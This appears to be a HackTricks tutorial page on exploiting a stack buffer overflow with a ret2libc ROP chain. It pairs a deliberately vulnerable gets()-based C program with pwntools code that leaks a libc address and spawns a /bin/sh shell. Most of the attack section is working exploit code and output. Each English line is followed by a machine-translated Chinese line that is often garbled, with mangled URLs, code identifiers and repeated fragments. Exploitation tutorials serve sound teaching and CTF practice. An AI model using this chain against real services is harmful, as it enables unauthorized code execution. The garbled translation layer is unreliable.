

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>支持hacktricks并获得好处！</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - 您在**网络安全公司**工作吗？ 您是否想看到您的**公司在hacktricks **中刊登广告？ 还是您想访问**最新版本的豌豆或在pdf **中下载hacktricks？ 检查[**订阅计划**]（https://github.com/sponsors/carlospolop）！

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - 发现[**豌豆家庭**]（https://opensea.io/collection/the-peass-family），我们的独家[** nfts **]（https://opensea.io/collection） /家庭家庭）

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - 获取[**官方豌豆和hacktricks赃物**]（https://peass.creator-spring.com）

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **加入** [**💬**]（https://emojipedia.org/speech-balloon/）[** discord group **]（https://discord.gg/hrep4ruj7f）或[ **电报组**]（https://t.me/peass）或**在** Twitter ** [**🐦**]（https://github.com/carloppolop/hacktrickss on ** twitter **） /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.md）eardme.md）eghterme.md）eghterme.md）eghterme.md）eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **通过将PRS提交给** [** hacktricks github repo **]（https://github.com/carloppolop/hacktricks）**。

</details>


# Quick Resume

＃快速简历

1. **Find** overflow **offset**

1. **查找**溢出**偏移**
2. **Find** `POP_RDI`, `PUTS_PLT` and `MAIN_PLT` gadgets

2. **找到** pop_rdi`，`puts_plt`和`main_plt`小工具
3. Use previous gadgets lo **leak the memory address** of puts or another libc function and **find the libc version** ([donwload it](https://libc.blukat.me))

3.使用以前的小工具lo **泄漏了puts或其他libc函数的内存地址**，**找到libc版本**（[donwload it it]（https://libc.blukat.me））
4. With the library, **calculate the ROP and exploit it**

4.使用库，**计算ROP并利用它**

# Other tutorials and binaries to practice

＃其他练习教程和二进制文件

This tutorial is going to exploit the code/binary proposed in this tutorial: [https://tasteofsecurity.com/security/ret2libc-unknown-libc/](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)\

本教程将利用本教程中提出的代码/二进制文件：[https://tasteofsecurity.com/security/ret2libc-unknown-libc/]（ ）\
Another useful tutorials: [https://made0x78.com/bseries-ret2libc/](https://made0x78.com/bseries-ret2libc/), [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)

另一个有用的教程：[https://made0x78.com/bseries-ret2libc/]（https://made0x78.com/bseries-ret2libc/） csaw19 \ _babyboi/index.html]（https://guyinatuxedo.github.io/08-bof _dynamic/csaw19 \ _babyboi/index.html）

# Code

Filename: `vuln.c`

```c
#include <stdio.h>

int main() {
    char buffer[32];
    puts("Simple ROP.\n");
    gets(buffer);

    return 0;
}
```

```bash
gcc -o vuln vuln.c -fno-stack-protector  -no-pie
```

# ROP - Leaking LIBC template

＃ROP-泄漏LIBC模板

I'm going to use the code located here to make the exploit.\

我将使用位于此处的代码进行利用。\ \
Download the exploit and place it in the same directory as the vulnerable binary and give the needed data to the script:

下载利用并将其放置在与弱势二进制文件相同的目录中，并将所需的数据提供给脚本：

{% content-ref url="rop-leaking-libc-template.md" %}

{％content-ref url =“ rop-leaking-libc-template.md”％}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)

[rop-leaking-libc-template.md]（rop-leaking-libc-template.md）
{% endcontent-ref %}

# 1- Finding the offset

＃1-查找偏移

The template need an offset before continuing with the exploit. If any is provided it will execute the necessary code to find it (by default `OFFSET = ""`):

在继续使用漏洞之前，该模板需要偏移。 如果提供的话，它将执行必要的代码以找到它（默认情况下`offset =“”`）：

```bash
###################
### Find offset ###
###################
OFFSET = ""#"A"*72
if OFFSET == "":
    gdb.attach(p.pid, "c") #Attach and continue
    payload = cyclic(1000)
    print(r.clean())
    r.sendline(payload)
    #x/wx $rsp -- Search for bytes that crashed the application
    #cyclic_find(0x6161616b) # Find the offset of those bytes
    return
```

**Execute** `python template.py` a GDB console will be opened with the program being crashed. Inside that **GDB console** execute `x/wx $rsp` to get the **bytes** that were going to overwrite the RIP. Finally get the **offset** using a **python** console:

**执行**`python template.py` gdb控制台将在程序崩溃时打开。 在该** GDB控制台内部**执行`x/wx $ rsp`以获取将覆盖RIP的**字节**。 最终使用** Python **控制台获得**偏移**：

```python
from pwn import *
cyclic_find(0x6161616b)
```

![](<../../../.gitbook/assets/image (140).png>)

After finding the offset (in this case 40) change the OFFSET variable inside the template using that value.\

找到偏移后（在这种情况下40）使用该值更改模板内部的偏移变量。
`OFFSET = "A" * 40`

Another way would be to use: `pattern create 1000` -- _execute until ret_ -- `pattern seach $rsp` from GEF.

另一种方法是使用：`模式创建1000`- _ execute，直到ret_-```ret_-）'gef的模式seach $ rsp`。

# 2- Finding Gadgets

Now we need to find ROP gadgets inside the binary. This ROP gadgets will be useful to call `puts`to find the **libc** being used, and later to **launch the final exploit**.

现在，我们需要在二进制中找到ROP小工具。 此ROP小工具将调用`puts`找到使用的** libc **很有用，然后以后**启动最终漏洞利用**。

```python
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
```

The `PUTS_PLT` is needed to call the **function puts**.\

需要“ puts_plt”调用**函数put **。
The `MAIN_PLT` is needed to call the **main function** again after one interaction to **exploit** the overflow **again** (infinite rounds of exploitation). **It is used at the end of each ROP to call the program again**.\

需要“ main_plt”再次调用** main函数**在一次交互后再次调用** exploit **再次溢出** **（无限的剥削回合）。 **在每个ROP的末尾使用它再次调用该程序**。
The **POP\_RDI** is needed to **pass** a **parameter** to the called function.

需要** pop \ _rdi ** **将** a **参数**传递给了调用函数。

In this step you don't need to execute anything as everything will be found by pwntools during the execution.

在此步骤中，您无需执行任何操作，因为在执行过程中，PWNTools会发现所有内容。

# 3- Finding LIBC library

Now is time to find which version of the **libc** library is being used. To do so we are going to **leak** the **address** in memory of the **function** `puts`and then we are going to **search** in which **library version** the puts version is in that address.

现在是时候找到正在使用** libc **库的版本了。 为此，我们将**泄漏** **地址**为了纪念**函数** p puts和，然后我们将** search ** ** library版本** puts版本在该地址中。

```python
def get_addr(func_name):
    FUNC_GOT = elf.got[func_name]
    log.info(func_name + " GOT @ " + hex(FUNC_GOT))
    # Create rop chain
    rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

    #Send our rop-chain payload
    #p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
    print(p.clean()) # clean socket buffer (read all and print)
    p.sendline(rop1)

    #Parse leaked address
    recieved = p.recvline().strip()
    leak = u64(recieved.ljust(8, "\x00"))
    log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
    #If not libc yet, stop here
    if libc != "":
        libc.address = leak - libc.symbols[func_name] #Save libc base
        log.info("libc base @ %s" % hex(libc.address))
    
    return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
    print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
    p.interactive()
```

To do so, the most important line of the executed code is:

为此，执行代码的最重要行是：

```python
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```

This will send some bytes util **overwriting** the **RIP** is possible: `OFFSET`.\

这将发送一些字节util **覆盖** ** rip **是可能的：`offset`。
Then, it will set the **address** of the gadget `POP_RDI` so the next address (`FUNC_GOT`) will be saved in the **RDI** registry. This is because we want to **call puts** **passing** it the **address** of the `PUTS_GOT`as the address in memory of puts function is saved in the address pointing by `PUTS_GOT`.\

然后，它将设置小工具的**地址** pop_rdi`，因此下一个地址（`func_got`）将保存在** rdi **注册表中。 这是因为我们想**呼叫put ** **传递**它的**地址** p puts_got`的地址作为记忆puts函数中的地址保存在地址中，由p puts_got`保存在地址。
After that, `PUTS_PLT` will be called (with `PUTS_GOT` inside the **RDI**) so puts will **read the content** inside `PUTS_GOT` (**the address of puts function in memory**) and will **print it out**.\

之后，将调用`puts_plt`将被调用（在** rdi **内使用`puts_got`），因此puts将**读取``puts_got'ence repand puts_got'（** puts函数**）和 将**打印出**。\ \
Finally, **main function is called again** so we can exploit the overflow again.

最后，**主函数再次称为**，因此我们可以再次利用溢出。

This way we have **tricked puts function** to **print** out the **address** in **memory** of the function **puts** (which is inside **libc** library). Now that we have that address we can **search which libc version is being used**.

这样，我们就**欺骗了函数** **在**内存**中的**地址** **的** put ** put **（在** libc **库中）。 现在我们已经有了这个地址，我们可以**搜索哪个libc版本正在使用**。

![](<../../../.gitbook/assets/image (141).png>)

As we are **exploiting** some **local** binary it is **not needed** to figure out which version of **libc** is being used (just find the library in `/lib/x86_64-linux-gnu/libc.so.6`).\

由于我们正在**利用**一些** local **二进制**不需要**才能找出正在使用哪个版本的** libc **（只需在`/lib/x86_64-linux中找到库 -gnu/libc.so.6`）。
But, in a remote exploit case I will explain here how can you find it:

但是，在远程利用案例中，我将在这里解释如何找到它：

## 3.1- Searching for libc version (1)

## 3.1-搜索libc版本（1）

You can search which library is being used in the web page: [https://libc.blukat.me/](https://libc.blukat.me)\

您可以在网页中搜索哪个库：[https://libc.blukat.me/]（https://libc.blukat.me）\
It will also allow you to download the discovered version of **libc**

它还允许您下载发现的** libc **的版本

![](<../../../.gitbook/assets/image (142).png>)

## 3.2- Searching for libc version (2)

## 3.2-搜索LIBC版本（2）

You can also do:

* `$ git clone https://github.com/niklasb/libc-database.git`
* `$ cd libc-database`
* `$ ./get`

This will take some time, be patient.\

这将需要一些时间，请耐心等待。
For this to work we need:

为此，我们需要：

* Libc symbol name: `puts`
* Leaked libc adddress: `0x7ff629878690`

*泄漏的libc adddress：`0x7ff629878690`

We can figure out which **libc** that is most likely used.

我们可以找出最有可能使用的** libc **。

```
./find puts 0x7ff629878690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```

We get 2 matches (you should try the second one if the first one is not working). Download the first one:

我们获得2次匹配（如果第一个不起作用，则应尝试第二场比赛）。 下载第一个：

```
./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
  -> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
  -> Downloading package
  -> Extracting package
  -> Package saved to libs/libc6_2.23-0ubuntu10_amd64
```

Copy the libc from `libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so` to our working directory.

从“ libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so”复制libc。

## 3.3- Other functions to leak

## 3.3-其他功能泄漏

```python
puts
printf
__libc_start_main
read
gets
```

# 4- Finding based libc address & exploiting

＃4-基于发现的LIBC地址和利用

At this point we should know the libc library used. As we are exploiting a local binary I will use just:`/lib/x86_64-linux-gnu/libc.so.6`

在这一点上，我们应该知道使用的LIBC库。 当我们利用本地二进制文件时，我将仅使用：`/lib/x86_64-linux-gnu/libc.so.6``

So, at the begging of `template.py` change the **libc** variable to: `libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #Set library path when know it`

因此，在`template.py的开头。 `

Giving the **path** to the **libc library** the rest of the **exploit is going to be automatically calculated**.

将**路径**提供给** libc库** **漏洞将自动计算**。

Inside the `get_addr`function the **base address of libc** is going to be calculated:

在“ get_addr”函数中，将计算Libc **的基础地址：

```python
if libc != "":
    libc.address = leak - libc.symbols[func_name] #Save libc base
    log.info("libc base @ %s" % hex(libc.address))
```

{% hint style="info" %}

{％提示样式=“ info”％}
Note that **final libc base address must end in 00**. If that's not your case you might have leaked an incorrect library.

请注意，**最终LIBC基础地址必须以00 **结束。 如果不是您的情况，您可能已经泄露了一个不正确的库。
{% endhint %}

Then, the address to the function `system` and the **address** to the string _"/bin/sh"_ are going to be **calculated** from the **base address** of **libc** and given the **libc library.**

然后，函数`system'的地址和字符串_“/bin/sh” _的**地址**将是**从** of ** of ** libc*的基础地址**计算** ** *并给定** libc库。**

```python
BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```

Finally, the /bin/sh execution exploit is going to be prepared sent:

最后， /bin /sh执行利用将准备好：

```python
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

#### Interact with the shell #####
p.interactive() #Interact with the conenction
```

Let's explain this final ROP.\

让我们解释一下这个最后的rop。\ \
The last ROP (`rop1`) ended calling again the main function, then we can **exploit again** the **overflow** (that's why the `OFFSET` is here again). Then, we want to call `POP_RDI` pointing to the **addres** of _"/bin/sh"_ (`BINSH`) and call **system** function (`SYSTEM`) because the address of _"/bin/sh"_ will be passed as a parameter.\

最后一个ROP（``rop1`）再次呼叫主函数，然后我们可以**再次利用** **溢出**（这就是为什么``offset''再次在这里）的原因。 然后，我们要调用`pop_rdi`指向_“/bin/sh” _（`binsh`）的** addres ** addres **，并调用** system ** function（`systems`），因为_”的地址_” /bin/sh“ _将作为参数传递。\
Finally, the **address of exit function** is **called** so the process **exists nicely** and any alert is generated.

最后，退出函数的**地址**被称为**，因此该过程**存在很好**，并生成任何警报。

**This way the exploit will execute a **_**/bin/sh**_** shell.**

**这样的方法将执行A ** _ **/bin/sh ** _ ** shell。**

![](<../../../.gitbook/assets/image (143).png>)

# 4(2)- Using ONE\_GADGET

You could also use [**ONE\_GADGET** ](https://github.com/david942j/one\_gadget)to obtain a shell instead of using **system** and **"/bin/sh". ONE\_GADGET** will find inside the libc library some way to obtain a shell using just one **ROP address**. \

您也可以使用[**一个\ _gadget **]（https://github.com/david942j/one \ _gadget）来获得外壳，而不是使用**系统**和**和**和**“/bin/sh”。 一个\ _gadget **将在libc库中以某种方式找到仅使用一个** rop地址**获得壳的方式。 \ \
However, normally there are some constrains, the most common ones and easy to avoid are like `[rsp+0x30] == NULL` As you control the values inside the **RSP** you just have to send some more NULL values so the constrain is avoided.

但是，通常会有一些约束，最常见的和易于避免的是`[rsp+0x30] == null`当您控制** rsp **内部的值时，您只需要发送更多的空值 避免了约束。

![](<../../../.gitbook/assets/image (615).png>)

```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```

# EXPLOIT FILE

You can find a template to exploit this vulnerability here:

您可以在此处找到一个模板来利用此漏洞：

{% content-ref url="rop-leaking-libc-template.md" %}

{％content-ref url =“ rop-leaking-libc-template.md”％}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)

[rop-leaking-libc-template.md]（rop-leaking-libc-template.md）
{% endcontent-ref %}

# Common problems

## MAIN\_PLT = elf.symbols\['main'] not found

## main \ _plt = elf.symbols \ ['main']找不到

If the "main" symbol does not exist. Then you can just where is the main code:

如果“主要”符号不存在。 然后，您可以在哪里是主要代码：

```python
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```

and set the address manually:

并手动设置地址：

```python
MAIN_PLT = 0x401080
```

## Puts not found

##找不到

If the binary is not using Puts you should check if it is using

如果二进制不使用put，则应检查是否正在使用

## `sh: 1: %s%s%s%s%s%s%s%s: not found`

##`sh：1：％s％s％s％s％s％s％s％s：找不到

If you find this **error** after creating **all** the exploit: `sh: 1: %s%s%s%s%s%s%s%s: not found`

如果您发现此**错误**创建**所有** exploit：`sh：1：％s％s％s％s％s％s％s％s％s：找不到

Try to **subtract 64 bytes to the address of "/bin/sh"**:

尝试**将64个字节减为“/bin/sh” **：

```python
BINSH = next(libc.search("/bin/sh")) - 64
```


<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>支持hacktricks并获得好处！</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - 您在**网络安全公司**工作吗？ 您是否想看到您的**公司在hacktricks **中刊登广告？ 还是您想访问**最新版本的豌豆或在pdf **中下载hacktricks？ 检查[**订阅计划**]（https://github.com/sponsors/carlospolop）！

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - 发现[**豌豆家庭**]（https://opensea.io/collection/the-peass-family），我们的独家[** nfts **]（https://opensea.io/collection） /家庭家庭）

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - 获取[**官方豌豆和hacktricks赃物**]（https://peass.creator-spring.com）

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **加入** [**💬**]（https://emojipedia.org/speech-balloon/）[** discord group **]（https://discord.gg/hrep4ruj7f）或[ **电报组**]（https://t.me/peass）或**在** Twitter ** [**🐦**]（https://github.com/carloppolop/hacktrickss on ** twitter **） /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.md）eardme.md）eghterme.md）eghterme.md）eghterme.md）eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **通过将PRS提交给** [** hacktricks github repo **]（https://github.com/carloppolop/hacktricks）**。

</details>


